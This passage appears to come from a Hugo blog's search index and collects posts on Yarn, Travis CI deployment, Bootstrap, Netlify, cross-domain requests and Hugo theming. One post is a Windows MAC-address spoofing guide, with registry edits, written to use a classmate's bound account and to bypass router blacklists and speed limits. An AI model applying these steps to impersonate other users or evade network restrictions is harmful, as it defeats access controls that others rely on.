yarn：\nnpm install --global yarn  此外你还需要在终端里设置PATH环境变量来全局访问 Yarn 的二进制可执行程序。 添加 set PATH=%PATH%;C:\\.yarn\\bin 到你的 shell 环境。\n  提示： 请把你的项目目录和 Yarn 缓存目录 (%LocalAppData%\\Yarn) 加到你的杀毒软件白名单里，否则安装包时会明显变慢，每个写入到硬盘时将被扫描。    测试 Yarn 是否安装成功  运行如下命令：\nyarn --version  Mac OS 中如何安装 Debian/Ubuntu Linux 中如何安装 Nightly Builds Nightly Builds 是 Yarn 最新和最大的版本，使用最新的 Yarn 代码构建。Nightly Builds 对于尝试还没有作为稳定版发布的新功能或测试 bug 修复很有用。这些 Builds 不保证稳定并且可能有 bugs。 请参阅如何安装 Nightly Builds\n 有问题吗？ 如果你不能用这些安装程序安装 Yarn，请通过 GitHub 搜索一个 issue 或者开一个新的 issue。\n搜索现有的 issue · 开一个新的 issue\n 使用 现在Yarn已经 安装完毕，可以开始使用。以下是一些你需要的最常用的命令：\n 初始化新项目\nyarn init  添加依赖包\nyarn add [package] yarn add [package]@[version] yarn add [package]@[tag]  将依赖项添加到不同依赖项类别 分别添加到 devDependencies、peerDependencies 和 optionalDependencies：\nyarn add [package] --dev yarn add [package] --peer yarn add [package] --optional  升级依赖包\nyarn upgrade [package] yarn upgrade [package]@[version] yarn upgrade [package]@[tag]  移除依赖包\nyarn remove [package]  安装项目的全部依赖\nyarn 或者 yarn install    延伸阅读 Yarn 工作流(如何使用Yarn？方便的创建与使用Yarn包的工作流程将帮你快速提高生产力。) CLI 命令(Yarn 通过一组丰富的命令执行包安装、管理、发布等操作。)\n官方文档\n","permalink":"http://localhost:8000/public/post/yarn%E4%BD%BF%E7%94%A8%E6%96%87%E6%A1%A3/","tags":["yarn","npm","包管理"],"title":"yarn使用文档"},{"categories":["搬运整理"],"contents":" mac地址是硬件地址，又被称物理地址是用来定义网络设备的位置。现在很多学校喜欢把用户账号与电脑的mac地址绑定，以确定一台电脑登录一个账号。其实只需要把mac地址修改成他电脑的mac地址就可以使用小伙伴的网线，用小伙伴的账号登录了。 另外当发现自己笔记本连的WiFi被限速或者被拉黑连不上了，同样可以修改无线网卡的mac地址来解除这些限制，因为路由器的限速及拉黑对象都是基于mac地址来识别的。下面看详细教程。\n \n查看mac地址 打开命令提示符工具（Win+R输入*cmd*调出），进入cmd窗口,输入命令“ipconfig /all ”,回车如下： 查看网卡驱动名 设备管理器 \u0026ndash;\u0026gt; 网络适配器: 伪装有线网卡mac地址 设置 \u0026ndash;\u0026gt; 网络和Internet \u0026ndash;\u0026gt; 更改适配器选项（或者：控制面板 \u0026ndash;\u0026gt; 网络和 Internet \u0026ndash;\u0026gt; 网络连接）进入如下窗口： 右键单击以太网 \u0026ndash;\u0026gt; 属性，进入如下窗口： 单击配置，进入如下窗口： 选择 高级 \u0026ndash;\u0026gt; Network Address，在“值”里面填写你想要的任意mac地址。注意： \u0026gt; 1. 每两位之间不需要短横线“-”； \u0026gt; 2. 第二位数值只能是 “2”，“6”，“A”，“E”中的一个，否则设置无效\n接下来按照查看mac地址方法验证一下，会发现以太网的mac地址确实变成我们刚才设的那个值了。\n伪装无线网卡mac地址 当你用同样的步骤去修改无线网卡mac地址时，你会发现找不到 “Network Address”属性，因为对于绝大多数无线网卡,其驱动以及windows的支持并不把修改mac作为可行,这时我们就需要通过修改注册表来添加“Network Address”属性。下面介绍如何设置。请先保证每步都看懂了,备份注册表后,再进行尝试。注册表修改要慎重,尤其是本次涉及windows的网络模块,很可能做错了导致启动异常,所以保证看懂了,会用了,再去尝试。\n打开注册表编辑器 Win+R输入*regedit*调出， 定位到\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Class{4d36e972-e325-11ce-bfc1-08002be10318}位置，如下： 并查看此下所有主键（0000，0001，0002，\u0026hellip;\u0026hellip;，0017）,一般都有十个左右的主键,由于我个人笔记本用的外接网卡比较多,所以主键多点，这里有17个。从0000起,鼠标选中,查看右侧,查看名称为DriverDesc的项目数据,看看是不是刚刚在设备管理器中看到的网卡名称。看我的,我在0001中找到了自己的有线网卡Realtek PCle GBE Family Controler,0001主键中还有一项Network Address,其值是我的mac地址,此处可以修改固定网卡mac。 对比下0001/Ndi/params/主键下的内容,发现了吧,嘿嘿,完全对应windows的高级选项卡中的所有选项,这样相信大家已经有了大概想法了。 再按刚才的方法找无线网卡的主键,找到了0002主键，对应Intel\u0026reg; Dual Band Wireless-AC 3160无线网卡。 发现Ndi/params/下没有networkaddress项目（图片上是我后来添加的）,于是,我们想到了手动添加这些信息。如下图： 在左侧 0002/Ndi/params下新建项目名称为NetworkAddress。 接着选中NetworkAddress,右侧设置完全复制那个有线网卡的内容即可。其中default的值（即默认macd地址）可设可不设。 OK，搞定！现在我们可以按照*伪装有线网卡mac地址*一样的方法来*伪装无线网卡mac地址*了。 接下来按照查看mac地址方法验证一下，会发现以太网的mac地址确实变成我们刚才设的那个值了。如果没有，重启电脑试一下。最后再次强调：mac地址的第二位数值必须设置成 “2”，“6”，“A”，“E”中的一个，否则设置无效\n参考 1. 怎么修改电脑mac地址，如何修改win10的mac地址 2. 无线网卡的 mac 地址在 Win10中怎么修改？ 3. 教你修改无线网卡的MAC地址的方法\n","permalink":"http://localhost:8000/public/post/win10%E6%9C%89%E7%BA%BF%E7%BD%91%E5%8D%A1%E5%8F%8A%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1mac%E5%9C%B0%E5%9D%80%E7%9A%84%E4%BC%AA%E8%A3%85/","tags":["windows","win10","mac地址"],"title":"win10有线网卡及无线网卡mac地址的伪装"},{"categories":["静态博客"],"contents":" Hugo 与 Netlify 相关的待更新\n自动部署的好处是：只需将源码分支推送git push origin branch-name到GitHub上,自动部署服务即可在线帮你完成后续所有的生成及部署操作。它在简化你的操作的同时，也同步地将你的源码文件保存在了GitHub上。这样即便你因电脑故障或误操作导致源码文件消失，也依然可以从GitHub上找回。 目前用得较多的两个免费的自动化服务有 Travis CI 与 Netlify，都可以比较方便的自动部署你的 Hexo 或 Hugo 静态博客。前者主要托管在 GitHub Pages 免费空间上，而后者本身就提供了免费的空间。总的来说，若仅仅只需完成静态博客的自动部署的话，Netlify 在操作上要更简单一些。\n \n一、 新建新的分支 master：博客的静态文件，也就是hexo生成后的HTML文件，因为要使用 GitHub Pages 服务，所以他规定的网页文件必须是在master分支\n建新的分支：dev：存放博客的源代码\nGit怎么推送本地分支到远程新分支上面去？\ngit push --force origin local_branch:remote_branch\n这个操作，local_branch必须为你本地存在的分支，remote_branch为远程分支，如果remote_branch不存在则会自动创建分支。\n类似，git push origin :remote_branch，local_branch留空的话则是删除远程remote_branch分支。\n这里是分支常用命令：  列出所有本地分支 $ git branch\n 列出所有远程分支 $ git branch -r\n 列出所有本地分支和远程分支 $ git branch -a\n 新建一个分支，但依然停留在当前分支 $ git branch [branch-name]\n 新建一个分支，并切换到该分支 $ git checkout -b [branch]\n 新建一个分支，指向指定commit $ git branch [branch] [commit]\n 新建一个分支，与指定的远程分支建立追踪关系 $ git branch --track [branch] [remote-branch]\n 切换到指定分支，并更新工作区 $ git checkout [branch-name]\n 切换到上一个分支 $ git checkout -\n 建立追踪关系，在现有分支与指定的远程分支之间 $ git branch --set-upstream [branch] [remote-branch]\n 合并指定分支到当前分支 $ git merge [branch]\n 选择一个commit，合并进当前分支 $ git cherry-pick [commit]\n 删除分支 $ git branch -d [branch-name]\n 删除远程分支\n$ git push origin --delete [branch-name] $ git branch -dr [remote/branch]   二、配置Travis  接入Travis CI  打开Travis CI网站，使用github账号登录。 将鼠标放在右上角的用户名上，点击Account选项，会显示github的项目。 找到博客项目，点击前面带有 X 符号的按钮，开启travis支持。    然后点击设置按钮，在项目的设置中开启Build only if .travis.yml is present这一项.\n到这一步， 我们已经开启了要构建的仓库\n 在Travis CI配置Github的Access Token\n 在github上生成Access Token   首先我们来到github的设置界面，点击到Personal access tokens页面，点击右上角的Generate new token按钮会重新生成一个，点击后他会叫你输入密码，然后来到如下界面，给他去一个名字，下面是勾选一些权限\n生成完后，你需要拷贝下来,接下来要用到\n 在Travis CI配置  配置界面还是在项目的setting里面，如下图\n还需要在源代码的仓库里创建一个.travis.yml配置文件，放到源代码的根目录，如下图\n其中内容如下：\nlanguage: node_js node_js: stable # S: Build Lifecycle install: - npm install #before_script: # - npm install -g gulp script: - hexo g after_script: - cd ./public - git init - git config user.name \u0026quot;lifengsofts\u0026quot; - git config user.email \u0026quot;lifengsofts@gmail.com\u0026quot; - git add . - git commit -m \u0026quot;Update docs\u0026quot; - git push --force --quiet \u0026quot;https://${GH_TOKEN}@${GH_REF}\u0026quot; master:master # E: Build LifeCycle branches: only: - blog-source env: global: - GH_REF: github.com/lifengsofts/lifengsofts.github.io.git  其中给你需要更换的又git config后面的配置信息 GH_REF的值更改为你的仓库地址\n到这一步我们配置已经完成了\n三、本地操作  把远程仓库源码下载下来新建新的分支dev git clone -b dev https://github.com/poetries/poetries.github.io.git 切换到项目根目录下 开始写作 关联远程仓库 git remote add origin git@github.com:poetries/poetries.github.io.git 提交本地修改，推送至github仓库。\n $ git add .\n $ git commit -m \u0026quot;test travis\u0026quot;\n $ git push origin dev:dev\n  以下是自己在Ubuntu下写的一个很简单很简单的脚本，用来方便写作部署博客\n hexo-write.sh hexo-deploy.sh  push本地的代码至远程仓库之后，在https://travis-ci.org后台查看相关情况。\n下面是成功的结果：\n参考：  使用Travis自动部署Hexo(3) 使用Travis自动部署Hexo(1) ","permalink":"http://localhost:8000/public/post/hexo%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2%E5%88%B0github/","tags":["Hexo","Hugo"],"title":"Hexo|Hugo持续集成自动部署到github"},{"categories":["Front-End","搬运整理"],"contents":" 网格选项 row：行\ncol-*-*：列\n 第一个*可以为xs[超小]/sm[小型]/md[中型]/lg[大型] 第二个*必须为12以内的[列数]  col-*-offset-*：列偏移\n 第一个*和上面一样,第二个*范围是1到11,表示把该列的左外边距(margin)增加*列  col-*-*-*：列排序\n 第一个*和上面一样 第二个*可以为push[向右]/pull[向左] 第三个*范围是1到11[列数]  排版  small：内联子标题 lead：引导主体副本  text-*：文本样式\n *号可以为 left[左对齐]/center[居中对齐]/right[右对齐]/muted[减弱文本] /primary/success/info/warning/danger /justify[自动换行]/nowrap[不换行] /lowercase[小写]/uppercase[大写]/capitalize[首字母大写]\n list-inline：列表置于同一行\n  表格  table：基本样式(只有横向分隔线) table-*：表格样式\n *可以为striped[添加条纹]/bordered[添加边框]/hover[启用悬停]/condensed[更加紧凑]  tr/th/td 有\n active/success/info/warning/danger来改变背景颜色   将任意的table放在table-responsive内,实现响应式表格\n   bootstrap里active/success/info/warning/danger对应的背景颜色\n 表单 创建基本表单(垂直表单)的步骤\n 向父 \u0026lt;form\u0026gt; 元素添加 role=\u0026quot;form\u0026quot; 把标签和控件放在一个带有 .form-group 的 \u0026lt;div\u0026gt; 中。这是获取最佳间距所必需的 向所有的文本元素 \u0026lt;input\u0026gt;、\u0026lt;textarea\u0026gt; 和 \u0026lt;select\u0026gt; 添加 .form-control  创建水平表单的步骤\n 向父 \u0026lt;form\u0026gt; 元素添加 .form-horizontal 把标签和控件放在一个带有 .form-group 的 \u0026lt;div\u0026gt; 中 向标签添加 .control-label  常见的表单控件主要是\n  input、textarea、checkbox、radio 和 select input: 声明type有text、password、datetime、datetime-local、date、month、time、week、 number、email、url、search、tel 和 color    对父元素添加验证状态has-*:验证样式(*可以为warning/error/success)  按钮  btn：基本样式\n btn-*：其他样式\n *可以为default/primary/success/info/warning/danger /link[让按钮看起来像个链接]/lg/sm/xs/block[块级按钮,拉伸至父元素100%的宽度]/active/disabled   图片  img-*：图片样式(*可以为rounded[圆角6px] /circle[圆形] /thumbnail[添加内边距和一个灰色的边框]/responsive)  辅助类  Bootstrap里的一些辅助类,除了上面的active/success/info/warning/danger 还有\n  pull-left/right 元素浮动到左边/右边 center-block 设置元素为 display:block 并居中显示 clearfix 清除浮动 show/hidden 强制显示/隐藏\n close 显示关闭按钮\n caret 显示下拉式功能\n divider 分隔线\n  字体图标  在 fonts 文件夹内可以找到字体图标，它包含了下列这些文件\n glyphicons-halflings-regular.eot glyphicons-halflings-regular.svg glyphicons-halflings-regular.ttf glyphicons-halflings-regular.woff   图标参考：http://www.runoob.com/bootstrap/bootstrap-glyphicons.html  下拉菜单  dropdown：下拉菜单\n dropdown-menu： 下拉菜单\n dropdown-header：下拉菜单区域标题\n  按钮组  btn-group：里面放置一系列btn\n btn-toolbar：里面放置几组btn-group\n btn-group-*：调整按钮组的样式(*可以为xs/sm/lg/vertical)\n .btn-group 容器添加 .dropup实现按钮上拉菜单\n  输入框组 向 .form-control 添加前缀或后缀元素的步骤\n 把前缀或后缀元素放在一个带有 .input-group 的 \u0026lt;div\u0026gt;中 接着，在相同的 \u0026lt;div\u0026gt; 内，在 class 为 .input-group-addon 的 \u0026lt;span\u0026gt; 内放置额外的内容 把该 \u0026lt;span\u0026gt; 放置在 \u0026lt;input\u0026gt; 元素的前面或者后面  导航元素  nav nav-tabs ：标签式的导航菜单 nav nav-pills：胶囊式的导航菜单  ","permalink":"http://localhost:8000/public/post/bootstrap-summary/","tags":["Bootstrap"],"title":"bootstrap常用类小结"},{"categories":["搬运整理"],"contents":"转载自-freehao123.com\n最近因为Coding对免费用户的pages服务强加跳转提示广告，让不少人不得不将自己的博客迁回Github。但是Github也有一些无法克服的缺陷：一是访问速度不是很稳定；二是想上SSL只能通过CloudFlare实现。并且CloudFlare访问速度和稳定性都不太好。\n今天推荐的netlify则是国外一家提供静态网络托管服务的综合平台，专注于静态网站托管的web服务平台，可以完美的取代Coding。 Netlify完美且免费支持的ssl、域名绑定、http/2和TLS。最重要的就是，管理方式用git方法传递给github、gitlab或者是Bitbucket，然后Netlify就能自动编译并生成静态网站。\n对于想要使用Jekyll、Hexo、Hugo等静态搭建网站，又害怕复杂的本地环境配置的朋友，Netlify支持自动编译Jekyll、Hexo、Hugo等常见的静态博客程序真得是太方便了。另外，Netlify也是一个非常好的静态空间，如果你有用纸小墨 inkPaper或者Html网页，直接就可以上传发布到空间上了。\n如果你喜欢静态网站和博客，你可以试试以下方法：\nNetlify优秀的静态博客托管平台-自动编译部署生成Web网站可绑域名支持SSL\n一、 Netlify使用前准备：熟悉Github和Git\n1、Github官网：\n 1、官方网站：https://github.com/  2、Netlify代码来自于Github、Gitlab或者BitBucket，所以你需要请先在Github、Gitlab或者BitBucket上建立一个代码库，并将自己的网页内容git上传到这个代码库中。Github建库，请看这篇文章：Github空间在线写文章。\n3、用过Github空间的朋友，都知道Github上的Repos都是公共的，除非你愿意付费，否则你放在Github上的代码都能被所有人下载到。而Bitbucket的免费版本的用户可以有无限的私有Repos。如果想要使用Bitbucket，参考：Bitbucket免费代码托管空间。\n4、Git使用。Git是目前世界上最先进的分布式版本控制系统，有愿意使用静态的博客的朋友建议系统学习一下Git。如果你只时想要建立一个静态博客，也可以使用Github Desktop，它可以让你像管理FTP那样上传更新代码，新手朋友再也不用害怕命令了。\n二、申请Netlify免费空间\n1、Netlify官网：\n 1、官方首页：https://www.netlify.com/  2、 首先是到netlify申请注册一个账号。这里可以使用Github、Gitlab以及Bitbucket直接授权登陆。然后登录到空间管理中心，点击右上角的\u0026rdquo;New site from Git\u0026rdquo;添加网站。\n3、然后根据自己的托管平台，可以选择GitHub、GitLab或者BitBucket。我们以最常用的GitHub为演示例子。（选择GitHub的同学，别忘了勾选下方的\u0026rdquo;Limit GitHub access to public repositories.\u0026ldquo;选项）\n4、点击GitHub之后会弹出一个让你授权的窗口，然后点击\u0026rdquo;Authorize netlify\u0026rdquo;之后，就会在netlify中读取你所有的代码库。 （点击放大）\n5、 点击你已经建好的库，选好分支（默认master即可），然后点击\u0026rdquo;Deploy site\u0026rdquo;，系统就会自动编译你的静态页面了。同时还会给出你的页面二级域名等信息。（点击放大）\n6、点击创建后，稍等一会儿，你就可以看到Netlify免费静态空间已经创建成功了，同时你在GitHub的代码也成功在Netlify运行了。 （点击放大）\n三、快速在Netlify建立Jekyll、Hexo、Hugo静态博客\n1、开源静态博客程序网站：\n 1、网站首页：https://www.staticgen.com/  2、StaticGen是Netlify旗下另一个开源的静态博客程序网站，这里汇集了大部分开源的静态博客程序，而Jekyll、Hexo、Hugo等几款常见的博客程序则可以一键部署到Netlify空间上。\n3、这里以Hexo为例，点击后跳转到Netlify页面，登录你的Github账号。\n4、命令一个新的项目名称。\n5、稍等一会儿，Netlify就会自动编译好Hexo博客，完成后如下图所示，你可以直接访问它给的二级域名了：（点击放大）\n四、Netlify文件管理-用GitHub Desktop图形化管理Github\n1、Netlify文件管理直接通过Git提交修改到Github，然后Netlify就会自动执行编译和部署了。不想使用Git的朋友，可以使用GitHub Desktop软件来管理Github空间代码。\n3、GitHub Desktop安装后，使用你的Github账号登录，然后你就可以开始下载、修改和上传代码文件了。这个就是GitHub Desktop软件界面了。\n4、以修改Hexo主题为例，首先找到一个漂亮的Hexo主题，从Github打包下载下来。\n5、然后将你在Github与Netlify连接创建好的项目通过GitHub Desktop下载到本地，进入到theme文件夹中。\n6、将下载下来的Hexo主题文件解压放在theme文件夹中。\n7、然后，修改配置文件_config.yml，将里面theme修改为你的主题，保存。\n8、现在打开GitHub Desktop软件，你会在Changes中看到文件变化，提示你提交变化。（点击放大）\n9、输入描述，点击提交。\n10、点击GitHub Desktop右上角的同步按钮，将文件上传到GitHub中，稍等一会儿，你就可以在Netlify那边也看到代码执行后的结果了。\n五、Netlify绑定域名方法\n1、点击Netlify页面左上角netlify的logo，你便可以进入静态空间的设置中心。然后请先记录下系统默认给你分配的二级域名，稍后会用到。在接下来点击\u0026rdquo;set up domain\u0026rdquo;，输入你要绑定的域名，点击\u0026rdquo;save\u0026rdquo;保存即可。\n2、输入你想要绑定的域名。\n3、确认后，你就可以看到域名已经成功绑定上了。你可以随时修改域名绑定。\n4、到你的域名DNS解析处，修改域名的CNAME记录，记录值就是刚刚你记下的Netlify二级域名。\n5、域名绑定完成。\n六、Netlify添加免费SSL证书\n1、设置完成域名绑定之后，设置中心的选项会有少许变化。会增加一个Enable HTTPS的选项。\n2、点进去，然后选择\u0026rdquo;Let\u0026rsquo;s Encrypt Certificate\u0026rdquo;按钮，系统会自动签发Let\u0026rsquo;s Encrypt证书给你的站点。\n3、不过前提条件是你的域名已经解析生效了。如果解析还没有生效，那么体会提示\u0026rdquo;签发失败\u0026rdquo;的错误。\n4、如果你想一直使用Https访问的话，可以勾选强制所有的访问转为Https。\n5、Netlify添加免费SSL证书成功。\n6、Netlify空间演示：\n 1、博客演示：https://blog.ps/ 2、主页演示：https://preacher-chipmunk-31460.netlify.com/freehao123/ 3、绑定域名：https://netlify.freehao123.info/  七、Netlify空间使用技巧\n1、Netlify可以直接添加html代码。在Netlify面板可以直接一键添加html代码到你的网站之前，这样你就可以很方便的把网站统计代码加到网站上了。\n2、Netlify可以设置变量及命令。Netlify的免费用户可以为自己的网站设置环境变量、hooks等等。而付费用户则可以为网站设置更加详细的SEO优化。（点击放大）\n3、Netlify的访问速度不错。在首页的地图标注上，是有国内节点的（当然也有可能是宣传画而已）。实测大陆访问全部解析到Amazon日本东京节点上，速度表现尚可。\n","permalink":"http://localhost:8000/public/post/netlify-%E8%87%AA%E5%8A%A8%E7%BC%96%E8%AF%91%E9%83%A8%E7%BD%B2%E7%94%9F%E6%88%90-web-%E7%BD%91%E7%AB%99/","tags":["Netlify"],"title":"Netlify 自动编译部署生成 Web 网站"},{"categories":["javascrip","Front-End"],"contents":" 什么是跨域？\n 概念如下：只要协议、域名、端口有任何一个不同，都被当作是不同的域  下面是具体的跨域情况详解\n   URL 说明 是否允许通信     http://www.a.com/a.js、http://www.a.com/b.js 同一域名下 允许   http://www.a.com/lab/a.js、http://www.a.com/script/b.js 同一域名下不同文件夹 允许   http://www.a.com:8000/a.js、http://www.a.com/b.js 同一域名，不同端口 不允许   http://www.a.com/a.js、https://www.a.com/b.js 同一域名，不同协议 不允许   http://www.a.com/a.js、http://70.32.92.74/b.js 域名和域名对应ip 不允许   http://www.a.com/a.js、http://script.a.com/b.js 主域相同，子域不同 不允许（cookie这种情况下也不允许访问）   http://www.a.com/a.js、http://a.com/b.js 同一域名，不同二级域名（同上） 不允许（cookie这种情况下也不允许访问）   http://www.cnblogs.com/a.js、http://www.a.com/b.js 不同域名 不允许    一、document.domain跨域  原理：相同主域名不同子域名下的页面，可以设置document.domain让它们同域 限制：同域document提供的是页面间的互操作，需要载入iframe页面   下面几个域名下的页面都是可以通过document.domain跨域互操作的： http://a.com/foo, http://b.a.com/bar, http://c.a.com/bar。 但只能以页面嵌套的方式来进行页面互操作，比如常见的iframe方式就可以完成页面嵌套\n // URL http://a.com/foo var ifr = document.createElement('iframe'); ifr.src = 'http://b.a.com/bar'; ifr.onload = function(){ var ifrdoc = ifr.contentDocument || ifr.contentWindow.document; ifrdoc.getElementsById(\u0026quot;foo\u0026quot;).innerHTML); }; ifr.style.display = 'none'; document.body.appendChild(ifr);   上述代码所在的URL是http://a.com/foo，它对http://b.a.com/bar的DOM访问要求后者将 document.domain往上设置一级  // URL http://b.a.com/bar document.domain = 'a.com'   document.domain只能从子域设置到主域，往下设置以及往其他域名设置都是不允许的， 在Chrome中给出的错误是这样的  Uncaught DOMException: Failed to set the 'domain' property on 'Document': 'baidu.com' is not a suffix of 'b.a.com'  二、有src的标签  原理：所有具有src属性的HTML标签都是可以跨域的，包括\u0026lt;img\u0026gt;, \u0026lt;script\u0026gt; 限制：需要创建一个DOM对象，只能用于GET方法    在document.body中append一个具有src属性的HTML标签， src属性值指向的URL会以GET方法被访问，该访问是可以跨域的 其实样式表的\u0026lt;link\u0026gt;标签也是可以跨域的，只要是有src或href的HTML标签都有跨域的能力    不同的HTML标签发送HTTP请求的时机不同，例如\u0026lt;img\u0026gt;在更改src属性时就会发送请求，而script, iframe, link[rel=stylesheet]只有在添加到DOM树之后才会发送HTTP请求：  var img = new Image(); img.src = 'http://some/picture'; // 发送HTTP请求 var ifr = $('\u0026lt;iframe\u0026gt;', {src: 'http://b.a.com/bar'}); $('body').append(ifr); // 发送HTTP请求  三、JSONP  原理：\u0026lt;script\u0026gt;是可以跨域的，而且在跨域脚本中可以直接回调当前脚本的函数 限制：需要创建一个DOM对象并且添加到DOM树，只能用于GET方法   JSONP利用的是\u0026lt;script\u0026gt;可以跨域的特性，跨域URL返回的脚本不仅包含数据，还包含一个回调\n // URL: http://b.a.com/foo var data = { foo: 'bar', bar: 'foo' }; callback(data);   然后在我们在主站http://a.com中，可以这样来跨域获取http://b.a.com的数据：  // URL: http://a.com/foo var callback = function(data){ // 处理跨域请求得到的数据 }; var script = $('\u0026lt;script\u0026gt;', {src: 'http://b.a.com/bar'}); $('body').append(script);   其实jQuery已经封装了JSONP的使用，我们可以这样来  $.getJSON( \u0026quot;http://b.a.com/bar?callback=callback\u0026quot;, function( data ){ // 处理跨域请求得到的数据 });   $.getJSON与$.get的区别是前者会把responseText转换为JSON，而且当URL具有callback参数时， jQuery将会把它解释为一个JSONP请求，创建一个\u0026lt;script\u0026gt;标签来完成该请求\n 四、navigation 对象  原理：iframe之间是共享navigator对象的，用它来传递信息 要求：IE6/7   有些人注意到了IE6/7的一个漏洞：iframe之间的window.navigator对象是共享的。 我们可以把它作为一个Messenger，通过它来传递信息。比如一个简单的委托：\n // a.com navigation.onData(){ // 数据到达的处理函数 } typeof navigation.getData === 'function' || navigation.getData()  // b.com navigation.getData = function(){ $.get('/path/under/b.com') .success(function(data){ typeof navigation.onData === 'function' || navigation.onData(data) }); }   与document.navigator类似，window.name也是当前窗口所有页面所共享的。也可以用它来传递信息。 同样蛋疼的办法还有传递Hash（有些人叫锚点），这是因为每次浏览器打开一个URL时，URL后面的#xxx部分会保留下来，那么新的页面可以从这里获得上一个页面的数据\n 五、跨域资源共享（CORS）  原理：服务器设置Access-Control-Allow-OriginHTTP响应头之后，浏览器将会允许跨域请求 限制：浏览器需要支持HTML5，可以支持POST，PUT等方法   前面提到的跨域手段都是某种意义上的Hack， HTML5标准中提出的跨域资源共享（Cross Origin Resource Share，CORS）才是正道。 它支持其他的HTTP方法如PUT, POST等，可以从本质上解决跨域问题。\n  例如，从http://a.com要访问http://b.com的数据，通常情况下Chrome会因跨域请求而报错  XMLHttpRequest cannot load http://b.com. No 'Access-Control-Allow-Origin' header is present on the requested resource. Origin 'http://a.com' is therefore not allowed access   错误原因是被请求资源没有设置Access-Control-Allow-Origin，所以我们在b.com的服务器中设置这个响应头字段即可  Access-Control-Allow-Origin: * # 允许所有域名访问，或者 Access-Control-Allow-Origin: http://a.com # 只允许所有域名访问  六、window.postMessage  原理：HTML5允许窗口之间发送消息 限制：浏览器需要支持HTML5，获取窗口句柄后才能相互通信   这是一个安全的跨域通信方法，postMessage(message,targetOrigin)也是HTML5引入的特性。 可以给任何一个window发送消息，不论是否同源。第二个参数可以是*但如果你设置了一个URL但不相符，那么该事件不会被分发。看一个普通的使用方式吧\n // URL: http://a.com/foo var win = window.open('http://b.com/bar'); win.postMessage('Hello, bar!', 'http://b.com');  // URL: http://b.com/bar window.addEventListener('message',function(event) { console.log(event.data); });  七、访问控制安全的讨论  在HTML5之前，JSONP已经成为跨域的事实标准了，jQuery都给出了支持。 值得注意的是它只是Hack，并没有产生额外的安全问题。 因为JSONP要成功获取数据，需要跨域资源所在服务器的配合，比如资源所在服务器需要自愿地回调一个合适的函数，所以服务器仍然有能力控制资源的跨域访问 跨域的正道还是要使用HTML5提供的CORS头字段以及window.postMessage， 可以支持POST, PUT等HTTP方法，从机制上解决跨域问题。 值得注意的是Access-Control-Allow-Origin头字段是资源所在服务器设置的， 访问控制的责任仍然是在提供资源的服务器一方，这和JSONP是一样的  ","permalink":"http://localhost:8000/public/post/cross-domain/","tags":["JavaScript","跨域"],"title":"web 开发中跨域解决方案"},{"categories":["Even theme preview"],"contents":" Introduction This tutorial will show you how to create a simple theme in Hugo. I assume that you are familiar with HTML, the bash command line, and that you are comfortable using Markdown to format content. I\u0026rsquo;ll explain how Hugo uses templates and how you can organize your templates to create a theme. I won\u0026rsquo;t cover using CSS to style your theme.\nWe\u0026rsquo;ll start with creating a new site with a very basic template. Then we\u0026rsquo;ll add in a few pages and posts. With small variations on that, you will be able to create many different types of web sites.\nIn this tutorial, commands that you enter will start with the \u0026ldquo;$\u0026rdquo; prompt. The output will follow. Lines that start with \u0026ldquo;#\u0026rdquo; are comments that I\u0026rsquo;ve added to explain a point. When I show updates to a file, the \u0026ldquo;:wq\u0026rdquo; on the last line means to save the file.\nHere\u0026rsquo;s an example:\n## this is a comment $ echo this is a command this is a command ## edit the file $vi foo.md +++ date = \u0026quot;2014-09-28\u0026quot; title = \u0026quot;creating a new theme\u0026quot; +++ bah and humbug :wq ## show it $ cat foo.md +++ date = \u0026quot;2014-09-28\u0026quot; title = \u0026quot;creating a new theme\u0026quot; +++ bah and humbug $  Some Definitions There are a few concepts that you need to understand before creating a theme.\nSkins Skins are the files responsible for the look and feel of your site. It’s the CSS that controls colors and fonts, it’s the Javascript that determines actions and reactions. It’s also the rules that Hugo uses to transform your content into the HTML that the site will serve to visitors.\nYou have two ways to create a skin. The simplest way is to create it in the layouts/ directory. If you do, then you don’t have to worry about configuring Hugo to recognize it. The first place that Hugo will look for rules and files is in the layouts/ directory so it will always find the skin.\nYour second choice is to create it in a sub-directory of the themes/ directory. If you do, then you must always tell Hugo where to search for the skin. It’s extra work, though, so why bother with it?\nThe difference between creating a skin in layouts/ and creating it in themes/ is very subtle. A skin in layouts/ can’t be customized without updating the templates and static files that it is built from. A skin created in themes/, on the other hand, can be and that makes it easier for other people to use it.\nThe rest of this tutorial will call a skin created in the themes/ directory a theme.\nNote that you can use this tutorial to create a skin in the layouts/ directory if you wish to. The main difference will be that you won’t need to update the site’s configuration file to use a theme.\nThe Home Page The home page, or landing page, is the first page that many visitors to a site see. It is the index.html file in the root directory of the web site. Since Hugo writes files to the public/ directory, our home page is public/index.html.\nSite Configuration File When Hugo runs, it looks for a configuration file that contains settings that override default values for the entire site. The file can use TOML, YAML, or JSON. I prefer to use TOML for my configuration files. If you prefer to use JSON or YAML, you’ll need to translate my examples. You’ll also need to change the name of the file since Hugo uses the extension to determine how to process it.\nHugo translates Markdown files into HTML. By default, Hugo expects to find Markdown files in your content/ directory and template files in your themes/ directory. It will create HTML files in your public/ directory. You can change this by specifying alternate locations in the configuration file.\nContent Content is stored in text files that contain two sections. The first section is the “front matter,” which is the meta-information on the content. The second section contains Markdown that will be converted to HTML.\nFront Matter The front matter is information about the content. Like the configuration file, it can be written in TOML, YAML, or JSON. Unlike the configuration file, Hugo doesn’t use the file’s extension to know the format. It looks for markers to signal the type. TOML is surrounded by “+++”, YAML by “---”, and JSON is enclosed in curly braces. I prefer to use TOML, so you’ll need to translate my examples if you prefer YAML or JSON.\nThe information in the front matter is passed into the template before the content is rendered into HTML.\nMarkdown Content is written in Markdown which makes it easier to create the content. Hugo runs the content through a Markdown engine to create the HTML which will be written to the output file.\nTemplate Files Hugo uses template files to render content into HTML. Template files are a bridge between the content and presentation. Rules in the template define what content is published, where it\u0026rsquo;s published to, and how it will rendered to the HTML file. The template guides the presentation by specifying the style to use.\nThere are three types of templates: single, list, and partial. Each type takes a bit of content as input and transforms it based on the commands in the template.\nHugo uses its knowledge of the content to find the template file used to render the content. If it can’t find a template that is an exact match for the content, it will shift up a level and search from there. It will continue to do so until it finds a matching template or runs out of templates to try. If it can’t find a template, it will use the default template for the site.\nPlease note that you can use the front matter to influence Hugo’s choice of templates.\nSingle Template A single template is used to render a single piece of content. For example, an article or post would be a single piece of content and use a single 